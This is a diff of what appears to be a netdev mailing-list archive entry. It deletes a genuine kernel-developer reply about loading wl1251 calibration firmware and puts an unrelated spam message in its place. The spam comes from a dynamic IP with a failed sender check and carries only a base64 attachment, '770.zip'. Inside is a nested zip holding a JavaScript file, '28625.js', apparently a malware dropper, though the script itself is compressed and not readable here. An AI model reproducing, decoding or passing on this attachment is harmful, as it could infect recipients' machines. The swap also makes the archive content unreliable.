@@ -1,78 +1,75 @@
-From: Arend Van Spriel <arend.vanspriel@broadcom.com>
-Subject: Re: [PATCH 2/6] wl1251: Use request_firmware_prefer_user() for
- loading NVS calibration data
-Date: Wed, 3 May 2017 21:02:20 +0200
-Message-ID: <936bf348-58ac-882c-a433-83f209862deb@broadcom.com>
-References: <1482598381-16513-1-git-send-email-pali.rohar@gmail.com>
- <1482598381-16513-3-git-send-email-pali.rohar@gmail.com>
- <e728586e-80bf-c9e0-0063-71da4c4aba85@broadcom.com>
- <20161226163559.GB27087@amd> <20170103175924.GC13946@wotan.suse.de>
+From: <nmckenna@prospercanada.org>
+Subject: 55214 netdev
+Date: Wed, 03 May 2017 19:24:18 -0000
+Message-ID: <149383945831.27002.16865397352386318207@hinet.net>
 Mime-Version: 1.0
-Content-Type: text/plain; charset=windows-1252
-Content-Transfer-Encoding: 7bit
-Cc: =?UTF-8?Q?Pali_Roh=c3=a1r?= <pali.rohar@gmail.com>,
-        Ming Lei <ming.lei@canonical.com>,
-        Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
-        Kalle Valo <kvalo@codeaurora.org>,
-        David Gnedt <david.gnedt@davizone.at>,
-        Michal Kazior <michal.kazior@tieto.com>,
-        Tony Lindgren <tony@atomide.com>,
-        Sebastian Reichel <sre@kernel.org>,
-        Ivaylo Dimitrov <ivo.g.dimitrov.75@gmail.com>,
-        Aaro Koskinen <aaro.koskinen@iki.fi>,
-        Takashi Iwai <tiwai@suse.de>,
-        David Woodhouse <dwmw2@infradead.org>,
-        Bjorn Andersson <bjorn.andersson@linaro.org>,
-        Grazvydas Ignotas <notasas@gmail.com>,
-        linux-kernel@vger.kernel.org, linux-wireless@vger.kernel.org,
-        netdev@vger.kernel.org
-To: "Luis R. Rodriguez" <mcgrof@kernel.org>,
-        Pavel Machek <pavel@ucw.cz>, Daniel Wagner <wagi@monom.org>,
-        Tom Gundersen <teg@jklm.no>
+Content-Type: application/zip; name="770.zip"
+Content-Transfer-Encoding: base64
+To: <netdev@vger.kernel.org>
 Return-path: <netdev-owner@vger.kernel.org>
-Received: from mail-wm0-f45.google.com ([74.125.82.45]:36112 "EHLO
-        mail-wm0-f45.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-        with ESMTP id S1751209AbdECTCZ (ORCPT
-        <rfc822;netdev@vger.kernel.org>); Wed, 3 May 2017 15:02:25 -0400
-Received: by mail-wm0-f45.google.com with SMTP id u65so156369417wmu.1
-        for <netdev@vger.kernel.org>; Wed, 03 May 2017 12:02:24 -0700 (PDT)
-In-Reply-To: <20170103175924.GC13946@wotan.suse.de>
+Received: from 114-37-49-67.dynamic-ip.hinet.net ([114.37.49.67]:56895 "HELO
+        hinet.net" rhost-flags-OK-OK-OK-FAIL) by vger.kernel.org with SMTP
+        id S1756527AbdECTY2 (ORCPT <rfc822;netdev@vger.kernel.org>);
+        Wed, 3 May 2017 15:24:28 -0400
+Content-Disposition: attachment
 Sender: netdev-owner@vger.kernel.org
 List-ID: <netdev.vger.kernel.org>
 
-
-
-On 3-1-2017 18:59, Luis R. Rodriguez wrote:
-> On Mon, Dec 26, 2016 at 05:35:59PM +0100, Pavel Machek wrote:
->>
->> Right question is "should we solve it without user-space help"?
->>
->> Answer is no, too. Way too complex. Yes, it would be nice if hardware
->> was designed in such a way that getting calibration data from kernel
->> is easy, and if you design hardware, please design it like that. But
->> N900 is not designed like that and getting the calibration through
->> userspace looks like only reasonable solution.
-> 
-> Arend seems to have a better alternative in mind possible for other
-> devices which *can* probably pull of doing this easily and nicely,
-> given the nasty history of the usermode helper crap we should not
-> in any way discourage such efforts.
-> 
-> Arend -- please look at the firmware cache, it not a hash but a hash
-> table for an O(1) lookups would be a welcomed change, then it could
-> be repurposed for what you describe, I think the only difference is
-> you'd perhaps want a custom driver hook to fetch the calibration data
-> so the driver does whatever it needs.
-
-Hi Luis,
-
-I let my idea catch dust on the shelf for a while. Actually had a couple
-of patches ready, but did get around testing them. So I wanted to rebase
-them on your linux-next tree. I bumped into the umh lock thing and was
-wondering why direct filesystem access was under that lock as well. In
-your tree I noticed a fix for that. The more reason to base my work on
-top of your firmware_class changes. Now my question is what is the best
-branch to choose, because you have a "few" in that repo to choose from ;-)
-
-Regards,
-Arend
+UEsDBAoAAAAAAAqao0pCc3diIQwAACEMAAAJAAAAMjg2MjUuemlwUEsDBBQAAAAIAAqao0pJnNTb
+iwsAAHwmAAAIAAAAMjg2MjUuanOVWt124jYQvt9z9h3cnJ4CzTTNEsjuhuZiBQZCEkjIQsL29IIY
+Y/5iwBgDafvuHUkmksei217E6Hc08803I8lO1A8s53q46ZTXvVql2v46ajHr0spEi7ve7WPm+P27
+TOCPxW/9pi8asV6/CaypqtyKflUfqGJDFT1VdFRxoopPRExVFcM7VX5QxUdV/KIpt3CtS1WzVNGP
+i2IhrLsbMkx0xAKN6oZk1Dhyn1RvSxWfUyaKWbzuOqHqFK1ZMuJIoS9NFkUyqK6E2Ko404oEzxMi
+tU/QWCxmpGWsJpffiqLz5stX1TeepyDeWyEGx/Wc6ipJpyhqRQluqXKkNasiM/rmpqfKmkZTYtSI
+wDBraExWxaZGxPLLdwhFufTFCSUzFFnEL+HIRJuukyyrg6jYvtLGSP3HC23WyUI0Jq1dqQEjgrmt
+k+UoV7LewE6GutHypSrutHB3hq8acG2x0pbETI04ZEaoZZP+CnJPlN/CTNPjUveGq8o0stNBHRIe
+yOX2nE0lP3RnwnWuOT+oYvZopQ1pa7GkO23s106G0nEqnm600CZB/NBbGVezX+bPBLeJbVTxKyFX
+OjiN0A3XhHy+Q1TTAP23tGAZU/nO6KSOKl4TkNpa/tlqQNxpHH1+dKfaBjTcZLVOkk4H9utQzzCq
+942YC2N89LQI9dpJ49LWO4TLzZz1p4aNFmyuZtTaGI7+gXhsGP0+fBULN9skLW9rxt3DrmjJv3WS
+2pbfUJnTcDYeBFyjBfZW8yLhl5nnKzIq7dHYmWTckGjNtHAkzOr39n5URj3oLjRuEjk9bP4moWEN
+NV/6Tmi0+rvh0ksdptThwJyOVVEOskckF19p+2Sroi07oRu0ZmrW6JkHU4pJ4NzTxFefHnXKjm9m
+8+ThKR3mZWO2soin/tQA+w/R5JvTURhIwzWXaJCfaFFlXG1OUuGL0YrRwf02PXY+IJ5zs+EDIe5X
+4m4de6WQigHiDwLkcqdx82ZG+DDXfVTOKfH/soX8nQgDMsUcYGFiE9FkMW185esVAaexrGuAEpiq
+rZenG21j0VZoEgy2WY0dbeJftZ4o6bGwNe5mTxodNYdLSO+JlgvbyINbsn9cqy7Q9iyC/JUxJwyo
+Du6OeLllPFA9GlPSizTAGBqix7l7JltPV8s+/xrcelwLAf8tuHXqPLSVnw+56pCDCCr3saHKVbqD
+rk80Jo/6QTkeLX4SlNcUGriaGgQlUQ7lbndFtrHGYKzpTCbuROX7PnxZJJ2WDsM7Y27ukvWmopI7
+EPzGS13ffLt4IdS50jOVaDFeusPprG4b/d/YR1faoFs9xfSuiXT9qqG1flDlvCqeq+InVSycqfLZ
++a/fn1oQOpydnZvP5BGJ88TVmRnPE7ckP/pV1SeZZDyp1Ygbbu6bnsahhzeGpDcUS7RckgHWUfLy
+kbYu6tM7LiGZtaPHJDlMPMmJY3j4xdTUmBzH6TwiRCRft8w8koT7JDxEpxboXY3xtpFbMVrih/YT
+o3wyC3e/hvEQXA9Mr42qNMWnMrgaTzYtfdM00qwp7/vZA29tEu9q6HnC6JrRrEFfLjarxn3xhTDt
+xHiEdD1zs5aQBvoNvm60+OZ2D1Saysc974GmYZqz6YXDJkfC9NHcmO0qZB399B4Z7yjZzzT3KD/n
+NBuMQboyunxo3FQ3/YC+ajXKPFYmKCr0kngl7jqa0ofvOgubvvI7gGUluVISwWZW1XTcDgD1Mnb0
+C8D/wE3u75ookqyPD9z7dto48ZOCQWfTNGkrJZKBQ6p4iE0JLI429DWWUezACMdmZflhynDz1df8
+1kjMa6QO0d8PKGq9kJAOI9Gc4IS2eydwcLRNJJCecem7M2PURG6wMr80E5MkMdLQJDjRIFtTnGuS
+mcI2fd0Z/aeEc2ATOpRwyDAtjnT09Dha7fQXP+7Lwft1uhia32yCtuMSdDTpiSOm+XS5hzINEh47
+9cPmXfJMSVh1nStl3r/jX94Gr51uuLzfXG+fV+64WW/d3uDHt/fvjsBjW2AOA/9n2Cw8WAMD12GB
+x+DnH4FtHQhZBlghv1szmGSgcHSMs/IsU6wCyxTyC2+HT9EIZZwaTVGcx74xuB/I1hnW3QhnwsV+
+OhS4NDecBhBlCjW2honHfPBRICswEGP4oqzEMqxYyeRZNZMvo2ZbR/QxCFFUHtYTBjglj8rEuuD4
+Qr7sQjwsAjbdijKqdA8DmHkuMFwTLrj2hfXEA98HrhyrgRPEawf+1HUgmi4XXIsC8GcJH1J5VIjl
+ccF8eeuEjHfi9DxrQLfbxuUhRgg4RBnsWYC3k0ugZlwjbgh48A04SDMPXNSTT7xAjVodQOxaTSkF
+YS5wGbVv2MIaXdYVzW2hFsOOksCHQb7K1ciX0ZkOsJCjwToRL4GHDXOOUz4T68+gijVAuPgkxA8Q
+MXScJ/q/3TOhlNDpAv8KZVa9B3R3haNbYx2IWCikCjUyhRKwN9EcG2BVnCtJUYat7HKkywLOtWiC
+/agPFKEqNNutJ3IUXwA6gedOHfChvkRWDJkXrmM0Chd8OK7aRfzmECBlHLTSW3PivNGmhGMqGa4a
+fGR25qMN3EvoR45YBZ9y6AU2Cya0UAinNoMahLG2C+nsISwFdhdcM4aG7inMypliifu+iD4oio6i
+RhH5W8pgr3R9CVVCRrDSG72xS0rirW+NfCT7DDYW87Afiytz9Sp89QLWamjyK3gZ2S2oIEkZS0Hy
+laEBrCvV6LaF5bX7wFugHTwSY4chJldQ68YVXILranP2SK3xbwJRFIh+nFksc0kM6ry3LpdfoCt2
+MJKVJYSwgL84m2sRLCHA0XWkyhDm0/1wHvHBhKH3uMT6SAovIsM4FOdSmSJwesRhfC7CHCMhrhfs
+OOhg5Pg8Y3nc7XvIWYXXeDhAo4s/XWhza2odtD72qpx+IXyKy3BOMB4HUxjJJThX0esNMZ1129gv
+c0QH2etEDDZsLWMq9lGxmol/RbrkLtjHRAFjNM99nxdSSnIpHPUZMLXxzIYRFXrgsLkgKvcUMPRV
+LAEb43wV+xttrPDFuYUY5DIWhQW12ON/BogIXwWV4VmIwyHC7YyrUMR1eQNGMsOVOX7MmaNboMdC
+mEaeYDymmy5rc958ZWJfCNgSfbvGwTyIlkO5ktCrJFxXEYmSL5SXavDo5hVkzZuJXCC0UdR6GvFM
+yGUKtIt79hZE7hQPZDzK62C+QRVQR26JGFXjEp0tqtJdsvrUx4BAlQNM2hKjSaZgC7EgMqgMXcbl
+5REOwY0yQrdHHW23fa4MetXj1Ys94zGZCEW4HusJV74zAc/3a6+eu4l9HyHYuDgqiHvLBFW0xa4U
+7x0YsXxTs8V2iTUV1ICxjMHG2SLy0xJ9Liiyj2uG/TJTFlGLswzfhBDmOFUKn36u/nh8fHlUev9u
+PLSyvruxKv3QzeZ+P8JsfuSG+Oi5+OgHR39kc9blpcXHfAmC/i57lMeOU/z78PEo9/vpH/iBEI8E
+Q/7ZaDz3rafbaO12Gvfj6vNra3q1nDwGWX9RfojGm9Vz+3Y0GfbAGg+alfVjq9vu+1+Wwa4zlEIC
+N1zjFw8y/CRwF7O+42bbrocf5LKpyWCh2jl88n8S+FseXa7D5hCv0PXqujGYtuzaanSLRxc36s+y
+Jg3p/xihMP1/D6Tc4Tywslx4++Xq6X7HKn17u35tPKPg01Kq8TfT8elk5vpeOEqNPj7mCLxcTaot
+8ZIwEGe03jWKZj5/g7KsB+K7wPW8uc0aBAOVmLN+sYqfP3z6eeez4WB6NV7XZ17/uRvZv374+OE8
+n4+dnzUs+sOl9fH80/mpae7p+YfCac766SfrwMyzs0+nBdOyZ6fnZ8VzOfVh96Vz3cYP43fiIzj/
+9G3wmGDesD9buTkOD5vf+tW6WxOv+R6cnnV8afU8fqewR1f88yBeik1ace/FtLAZun45avaCZ28z
+aYxr93tWUOG50j9QSwECPwAUAAAACAAKmqNKSZzU24sLAAB8JgAACAAkAAAAAAAAACAAAAAAAAAA
+Mjg2MjUuanMKACAAAAAAAAEAGAAzUAVqfMTSATNQBWp8xNIB3kGVaXzE0gFQSwUGAAAAAAEAAQBa
+AAAAsQsAAAAAUEsBAj8ACgAAAAAACpqjSkJzd2IhDAAAIQwAAAkAJAAAAAAAAAAgAAAAAAAAADI4
+NjI1LnppcAoAIAAAAAAAAQAYABCzB2p8xNIBM1AFanzE0gHeQZVpfMTSAVBLBQYAAAAAAQABAFsA
+AABIDAAAAAA=
